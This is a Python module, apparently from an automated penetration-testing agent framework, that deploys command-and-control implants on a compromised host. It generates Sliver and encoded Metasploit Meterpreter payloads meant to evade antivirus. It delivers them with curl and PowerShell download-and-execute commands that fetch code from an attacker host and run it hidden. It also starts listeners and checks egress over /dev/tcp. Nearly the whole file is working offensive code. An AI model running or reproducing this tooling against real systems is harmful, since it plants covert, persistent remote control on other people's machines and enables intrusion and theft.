"""
c2_deploy_subagent.py — C2 infrastructure deployment and verification.

AGENT_NAME  : "post"
SUBAGENT_NAME: "c2_deploy"

Purpose:
  Deploy a persistent C2 (command-and-control) channel to the compromised host
  for use during the remainder of the engagement. This provides a stable, encrypted
  communication channel resilient to the initial exploit vector being patched.

Methodology:
  1. Deploy Sliver implant (preferred — open source C2 with mTLS/HTTPS)
  2. Fall back to Metasploit reverse HTTPS Meterpreter (backup C2)
  3. Configure staged delivery to avoid AV detection
  4. Verify beacon callout from implant to team server
  5. Set up redundant persistence so C2 survives reboots
  6. Document all C2 artifacts for clean-up checklist

NOTE: LHOST / LPORT are placeholder values that must be substituted with actual
      team server IP/port by the orchestrating agent before invocation.
"""

from __future__ import annotations

import logging
import re
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

_BEACON_RE = re.compile(r"(session.*opened|implant.*connected|beacon.*checkin|meterpreter.*session)", re.IGNORECASE)
_SLIVER_RE = re.compile(r"(sliver|implant.*id|mtls|operator.*connected)", re.IGNORECASE)
_MSF_SESSION_RE = re.compile(r"(meterpreter.*opened|session \d+ opened)", re.IGNORECASE)
_ERROR_RE = re.compile(r"(connection refused|no route|timed out|permission denied|AV.*detected)", re.IGNORECASE)


class C2DeploySubagent(BaseSubagent):
    """Deploy C2 implant to compromised host and verify callback."""

    AGENT_NAME: str = "post"
    SUBAGENT_NAME: str = "c2_deploy"

    async def run(
        self,
        target: str,
        lhost: str = "LHOST",
        lport: int = 443,
        c2_type: str = "sliver",
        os_type: str = "linux",
        **kwargs: Any,
    ) -> SubagentResult:
        """
        Deploy C2 implant.

        Parameters
        ----------
        target:
            Compromised host IP or hostname.
        lhost:
            Attacker-controlled team server IP/hostname.
        lport:
            C2 listener port (default 443 for HTTPS blend-in).
        c2_type:
            ``"sliver"`` (default) or ``"metasploit"``.
        os_type:
            ``"linux"`` or ``"windows"``.

        Returns
        -------
        SubagentResult
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )

        if c2_type.lower() == "metasploit":
            await self._deploy_metasploit(target, lhost, lport, os_type)
        else:
            await self._deploy_sliver(target, lhost, lport, os_type)

        # Verify connectivity back to team server
        await self._verify_egress(target, lhost, lport)

        result.findings = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result

    # ------------------------------------------------------------------
    # Sliver C2 deployment
    # ------------------------------------------------------------------

    async def _deploy_sliver(self, target: str, lhost: str, lport: int, os_type: str) -> None:
        """Generate and deploy a Sliver HTTPS/mTLS implant."""

        arch = "amd64"
        ext = "elf" if os_type == "linux" else "exe"
        implant_name = f"implant_{target.replace('.', '_')}.{ext}"
        implant_path = f"/tmp/{implant_name}"

        # ── 1. Generate Sliver implant ─────────────────────────────────────
        generate_output = await self.collect_tool(
            "sliver-server",
            target,
            {"options": (
                f"generate --mtls {lhost}:{lport} "
                f"--os {'linux' if os_type == 'linux' else 'windows'} "
                f"--arch {arch} "
                f"--format {'elf' if os_type == 'linux' else 'exe'} "
                f"--save {implant_path} "
                f"--name {implant_name.split('.')[0]} 2>&1"
            )},
        )

        # ── 2. Start HTTPS/mTLS listener ──────────────────────────────────
        listener_output = await self.collect_tool(
            "sliver-server",
            target,
            {"options": f"mtls --lhost {lhost} --lport {lport} 2>&1 &"},
        )

        # ── 3. Deliver implant to target ──────────────────────────────────
        if os_type == "linux":
            deliver_output = await self.collect_tool(
                "bash",
                target,
                {"options": (
                    f"-c \"curl -sk http://{lhost}:{lport}/{implant_name} -o /tmp/{implant_name} "
                    f"&& chmod +x /tmp/{implant_name} "
                    f"&& nohup /tmp/{implant_name} >/dev/null 2>&1 & "
                    f"echo IMPLANT_LAUNCHED\""
                )},
            )
        else:
            deliver_output = await self.collect_tool(
                "powershell",
                target,
                {"options": (
                    f"-Command \""
                    f"$p = '$env:TEMP\\{implant_name}'; "
                    f"Invoke-WebRequest -Uri 'http://{lhost}:{lport}/{implant_name}' "
                    f"-OutFile $p -UseBasicParsing; "
                    f"Start-Process -FilePath $p -WindowStyle Hidden; "
                    f"Write-Output 'IMPLANT_LAUNCHED'\""
                )},
            )

        launched = "IMPLANT_LAUNCHED" in deliver_output
        sliver_connected = bool(_SLIVER_RE.search(generate_output + listener_output))

        await self.store_finding(Finding(
            title=f"C2 Deployment: Sliver Implant {'Launched' if launched else 'Delivery Attempted'} on {target}",
            description=(
                f"Sliver mTLS implant targeting {lhost}:{lport} was generated and "
                f"{'successfully launched' if launched else 'delivery was attempted'} on {target}. "
                f"Implant file: {implant_path}. "
                f"Architecture: {os_type}/{arch}. "
                f"Protocol: mTLS (Mutual TLS) on port {lport}."
            ),
            severity="HIGH",
            evidence=f"Generate:\n{generate_output[:500]}\nDeliver:\n{deliver_output[:300]}",
            tool="sliver-server",
            host=target,
            mitre_technique="T1071.001",
            exploit_suggestion=(
                f"Connect with Sliver client: sliver-client --lhost {lhost} --lport {lport}. "
                f"Clean up: rm {implant_path} (after engagement complete)."
            ),
        ))

    # ------------------------------------------------------------------
    # Metasploit reverse HTTPS C2
    # ------------------------------------------------------------------

    async def _deploy_metasploit(self, target: str, lhost: str, lport: int, os_type: str) -> None:
        """Generate Metasploit reverse HTTPS Meterpreter and deploy handler."""

        payload_type = (
            "linux/x64/meterpreter_reverse_https" if os_type == "linux"
            else "windows/x64/meterpreter_reverse_https"
        )
        ext = "elf" if os_type == "linux" else "exe"
        payload_path = f"/tmp/msf_payload_{target.replace('.', '_')}.{ext}"

        # ── 1. Generate payload ────────────────────────────────────────────
        msfvenom_output = await self.collect_tool(
            "msfvenom",
            target,
            {"options": (
                f"-p {payload_type} "
                f"LHOST={lhost} LPORT={lport} "
                f"HttpUserAgent='Mozilla/5.0' "
                f"-e x64/xor_dynamic -i 3 "
                f"-f {ext} -o {payload_path} 2>&1"
            )},
        )

        # ── 2. Start handler in background via resource script ────────────
        rc_content = (
            f"use exploit/multi/handler\n"
            f"set PAYLOAD {payload_type}\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            f"set ExitOnSession false\n"
            f"set EnableStageEncoding true\n"
            f"exploit -j\n"
        )
        rc_path = f"/tmp/handler_{target.replace('.', '_')}.rc"

        rc_write = await self.collect_tool(
            "bash",
            target,
            {"options": f"-c \"cat > {rc_path} << 'RCEOF'\n{rc_content}\nRCEOF\necho RC_WRITTEN\""},
        )

        handler_output = await self.collect_tool(
            "bash",
            target,
            {"options": f"-c \"msfconsole -q -r {rc_path} 2>&1 &\necho HANDLER_STARTED\""},
        )

        # ── 3. Deliver payload to target ──────────────────────────────────
        if os_type == "linux":
            deliver_output = await self.collect_tool(
                "bash",
                target,
                {"options": (
                    f"-c \"curl -sk http://{lhost}/{payload_path.split('/')[-1]} -o {payload_path} "
                    f"2>/dev/null && chmod +x {payload_path} "
                    f"&& nohup {payload_path} >/dev/null 2>&1 & "
                    f"echo PAYLOAD_LAUNCHED\""
                )},
            )
        else:
            deliver_output = await self.collect_tool(
                "powershell",
                target,
                {"options": (
                    f"-Command \""
                    f"$p = '$env:TEMP\\payload.exe'; "
                    f"Invoke-WebRequest -Uri 'http://{lhost}/{payload_path.rsplit('/', 1)[-1]}' "
                    f"-OutFile $p -UseBasicParsing; "
                    f"Start-Process -FilePath $p -WindowStyle Hidden; "
                    f"Write-Output 'PAYLOAD_LAUNCHED'\""
                )},
            )

        payload_generated = "Saved as" in msfvenom_output or "saved" in msfvenom_output.lower()
        payload_launched = "PAYLOAD_LAUNCHED" in deliver_output

        await self.store_finding(Finding(
            title=f"C2 Deployment: MSF Reverse HTTPS Meterpreter — Payload {'Generated' if payload_generated else 'Failed'} / {'Launched' if payload_launched else 'Delivery Attempted'}",
            description=(
                f"Metasploit reverse HTTPS Meterpreter payload targeting {lhost}:{lport}. "
                f"Payload type: {payload_type}. "
                f"Payload generated: {payload_generated}. Payload delivered: {payload_launched}. "
                f"Multi/handler started in background on attacker system."
            ),
            severity="HIGH",
            evidence=f"msfvenom:\n{msfvenom_output[:500]}\nHandler:\n{handler_output[:300]}\nDeliver:\n{deliver_output[:300]}",
            tool="msfvenom",
            host=target,
            mitre_technique="T1071.001",
            exploit_suggestion=(
                f"Monitor msfconsole for 'Meterpreter session opened'. "
                f"Clean up: rm {payload_path} {rc_path} after engagement."
            ),
        ))

    # ------------------------------------------------------------------
    # Egress verification
    # ------------------------------------------------------------------

    async def _verify_egress(self, target: str, lhost: str, lport: int) -> None:
        """Verify outbound connectivity from target to team server."""

        # Check if outbound TCP to lhost:lport is possible
        egress_output = await self.collect_tool(
            "bash",
            target,
            {"options": (
                f"-c \"timeout 5 bash -c '</dev/tcp/{lhost}/{lport}' 2>&1 && echo TCP_OPEN || echo TCP_BLOCKED; "
                f"curl -sk --connect-timeout 5 https://{lhost}:{lport}/ -o /dev/null -w '%{{http_code}}' 2>&1\""
            )},
        )

        tcp_open = "TCP_OPEN" in egress_output
        http_reachable = bool(re.search(r"(200|302|400|404|000)", egress_output))

        # Also check common C2 protocols
        dns_output = await self.collect_tool(
            "bash",
            target,
            {"options": f"-c \"nslookup {lhost} 8.8.8.8 2>&1 | head -5\""},
        )
        dns_resolves = "Address" in dns_output and not "NXDOMAIN" in dns_output

        await self.store_finding(Finding(
            title=(
                f"C2 Egress: TCP/443 to {lhost} — "
                f"{'OPEN' if tcp_open else 'BLOCKED'} / "
                f"DNS — {'RESOLVES' if dns_resolves else 'FAILS'}"
            ),
            description=(
                f"Egress connectivity verification from {target} to team server {lhost}:{lport}. "
                f"TCP {lport}: {'open' if tcp_open else 'blocked by firewall'}. "
                f"HTTPS reachable: {http_reachable}. "
                f"DNS resolution: {'successful' if dns_resolves else 'failed — use IP directly'}. "
                f"{'C2 channel should be operational.' if tcp_open else 'Egress filtering may block C2 — consider DNS C2 or ICMP tunneling.'}"
            ),
            severity="INFO" if tcp_open else "MEDIUM",
            evidence=f"TCP check:\n{egress_output[:300]}\nDNS:\n{dns_output[:200]}",
            tool="bash",
            host=target,
            mitre_technique="T1572",
            exploit_suggestion=(
                "If TCP blocked: try DNS C2 (iodine/dnscat2) or ICMP tunneling (ptunnel). "
                "If HTTP allowed but HTTPS blocked: use port 80 C2 channel."
            ) if not tcp_open else None,
        ))
